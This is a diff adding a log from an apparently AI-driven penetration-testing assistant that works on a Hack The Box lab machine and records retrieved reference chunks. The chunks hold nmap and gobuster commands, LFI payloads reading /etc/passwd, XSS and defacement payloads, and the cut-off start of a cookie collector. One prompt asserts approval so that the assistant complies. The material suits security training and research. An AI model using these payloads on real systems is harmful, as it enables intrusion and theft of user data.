@@ -1,0 +1,371 @@
+2024-05-07 11:18:38,767 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-07 11:18:38,767 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-07 11:20:43,961 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.22) | prompt: I have a Linux hack the box machine. The target IP is 10.129.228.212 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:22:15,384 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.16) | prompt:  1. IP: 10.129.228.212
+2. Host is up with 0.043s latency.
+3. 998 closed tcp ports (reset)
+4. Port 22/tcp open (SSH, OpenSSH 8.9p1 Ubuntu 3ubuntu0.1)
+5. Port 80/tcp open (http, nginx 1.18.0 (Ubuntu))
+6. Service detection: Linux (CPE: cpe:/o:linux:linux_kernel)
+ | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://example.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 11:23:43,124 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.00) | prompt:  1. Reconnaissance - (completed)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+
+3. Privilege Escalation - (to-do)
+  3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+  3.2 Scan for files that current user runs as root - (to-do)
+
+
+New Information:
+1. IP: 10.129.228.212
+2. Host is up with 0.043s latency.
+3. 998 closed tcp ports (reset)
+4. Port 22/tcp open (SSH, OpenSSH 8.9p1 Ubuntu 3ubuntu0.1)
+5. Port 80/tcp open (http, nginx 1.18.0 (Ubuntu))
+6. Service detection: Linux (CPE: cpe:/o:linux:linux_kernel) Possible todo tasks:
+1. Port Scan - (to-do)
+2. Investigate the service - (to-do)
+3. Look for ports on the local network 127.0.0.1 - (to-do)
+4. Scan for files that current user runs as root - (to-do)
+
+Favorable sub-task: 2. Investigate the service
+
+To perform the task:
+1. Gather information about the open ports and services running on them.
+2. Identify any known vulnerabilities or exploits for the services found on the open ports. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:24:14,436 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-07 11:27:35,966 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.05) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+The service running on port 80 is a web server. Accessing the service through a web browser results in a web page called superpass.htb. This is a password manager service. 
+Suggest methods for investigating the superpass.htb website | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://example.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-07 11:34:23,722 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.36) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Generate commands for tools for each step in the previous answer | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
+```
+
+## Web Application
+
+### Web Remote code
+
+### LFI (Local File Inclusion)
+
+Situation
+
+```
+http://<target>/index.php?parameter=value
+```
+
+#### How to Test
+
+```
+http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../etc/passwd
+
+```
+
+```
+http://<target>/script.php?page=../../../../../../../../boot.ini
+```
+
+#### LFI Payloads
+
+- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
+- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+
+### encode
+
+## XSS
+
+### Reflected
+
+#### Simple test
+
+This is a simple test to see what happens, this is not a prove that the field is vuln to xss
+
+```javascript
+<plaintext>
+```
+
+#### Simple XSS test
+
+```javascript
+<script>alert('Found')</script>
+```
+
+```javascript
+"><script>alert(Found)</script>">
+```
+
+```javascript
+<script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+#### Bypass filter of tag script
+
+`"  onload="alert(String.fromCharCode(88,83,83))`
+
+```javascript
+" onload="alert('XSS')
+```
+
+bla is not a valid image, so this cause an error
+
+```javascript
+<img src='bla' onerror=alert("XSS")>
+```
+
+### Persistent
+
+```javascript
+>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
+```
+
+### PHP collector
+
+`> cookie.txt`
+`chmod 
